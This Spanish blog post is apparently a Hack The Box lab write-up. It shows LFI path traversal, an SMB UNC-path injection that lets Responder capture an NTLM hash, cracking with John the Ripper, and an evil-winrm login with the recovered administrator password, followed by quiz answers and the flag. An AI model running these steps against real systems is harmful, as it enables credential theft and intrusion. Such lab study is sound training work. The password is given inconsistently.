---
layout: single
title: Responder - Hack The Box
excerpt: "asdasdad"
date: 2022-06-15
classes: wide
header:

categories:
  - hackthebox
  - infosec
tags:
  - responder
  - web
  - tools
---

# Responder - HackTheBox

![[Pasted image 20220427153530.png]]

Realizamos un escaneo de ==nmap== para identificar los puertos abiertos y servicios.

```nmap
nmap -v -p- --min-rate 5000 -sV -sC {target ip}
```

Resultado del escaneo:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 15:41 CDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Nmap scan report for 10.129.39.225
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Initiating NSE at 15:43
Completed NSE at 15:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.94 seconds
```

Visitamos el servidor web corriendo en el puerto 80 mediante el navegador (Firefox).

![[Pasted image 20220427161647.png]]
![[Pasted image 20220427161628.png]]

Nos redirige a una pagina web llamada **unika.htb**. Debido a que nos encontramos dentro de la misma red que la máquina objetivo y que ese dominio no esta registrado en un servidor DNS, procedemos a agregar la ip y el nombre de dominio al archivo **/etc/hosts** para poder visualizar la pagina web.

![[Pasted image 20220427162215.png]]

Ahora ya podemos visualizarla.

![[Pasted image 20220427162345.png]]

Navegando por la página nos encontramos con un apartado para cambiar el idioma, si nos fijamos en la url se ve como se incluye un archivo llamado **french.html** mediante **index.php**

![[Pasted image 20220427162745.png]]

Vamos a pasarle al parámetro "page" la siguiente cadena para saber si es vulnerable a **LFI** y como consecuencia a **path traversal**.

```
../../. ./../../../../../windows/system32/drivers/etc/hosts
```

![[Pasted image 20220427163537.png]]

![[Pasted image 20220427163432.png]]

Como podemos ver existe una vulnerabilidad en esta web.
Regresando al escaneo, el puerto **5985** se encuentra abierto lo que quiere decir que **WinRM** esta disponible. Podemos aprovecharnos del **LFI** de la página web para capturar el **hash NTLM** de la máquina con ayuda de la herramienta **responder**.

Vamos a ejecutar la herramienta con el siguente comando.

```
sudo responder -I tun0

(tun0 es la interfaz de red de nuestra máquina)
```

![[Pasted image 20220427170550.png]]

Verificamos que el servidor **SMB** este activado.

![[Pasted image 20220427170523.png]]

Mientras **responder** esta esperando una conexion, nos dirigimos a la URL de la página web e ingresamos la siguiente cadena en el parámetro page.

```
//{our machine ip}/somefile
```

Esto para que la página incluya un "recurso" de nuestro servidor **SMB** y se establezca una conexión.

![[Pasted image 20220427171130.png]]

Vemos en la terminal que se ha capturado el **hash NTLM**.

![[Pasted image 20220427171250.png]]

Guardamos el hash en un archivo de texto y lo desciframos con ayuda de la herramienta **John The Ripper** .

![[Pasted image 20220427171705.png]]

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20220427172056.png]]

A continuación utilizamos la herramienta **evilwinrm** para autenticarnos en el sistema con las credenciales obtenidas.

```
evil-winrm -i {target ip} -u administrator -p badminton
```

![[Pasted image 20220427172504.png]]

Ahora solo queda buscar el archivo ==flag.txt==. Este se encuentra en la ruta `C:\Users\mike\Desktop`.

![[Pasted image 20220427172844.png]]

## Preguntas

1. ¿Cuántos puertos TCP están abiertos en la máquina?
   **3**

2. Al visitar el servicio web utilizando la dirección IP, ¿cuál es el dominio al que se nos redirige?
   **unika.htb**

3. ¿Qué lenguaje de secuencias de comandos se utiliza en el servidor para generar páginas web?
   **php**

4. ¿Cuál es el nombre del parámetro de URL que se usa para cargar diferentes versiones de idioma de la página web?
   **page**

5. ¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad de inclusión de archivo local (LFI): "french.html", "//10.10.14.6/somefile", "../../. ./../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
   **../../. ./../../../../../windows/system32/drivers/etc/hosts**

6. ¿Qué significa NTLM?
   **New Technology LAN Manager**

7. ¿Qué indicador usamos en la utilidad Responder para especificar la interfaz de red?
   **-I**

8. Hay varias herramientas que aceptan un desafío/respuesta de NetNTLMv2 y prueban millones de contraseñas para ver si alguna de ellas genera la misma respuesta. A una de estas herramientas se la suele denominar `john`, pero el nombre completo es ¿cuál?.
   **John The Ripper**

9. ¿Cuál es la contraseña para el usuario administrador?
   **batminton**

10. Usaremos un servicio de Windows (es decir, que se ejecuta en la caja) para acceder de forma remota a la máquina Responder usando la contraseña que recuperamos. ¿En qué puerto TCP escucha?
    **5985**

Root Flag:
**ea81b7afddd03efaa0945333ed147fac**

![[Pasted image 20220427134218.png]]
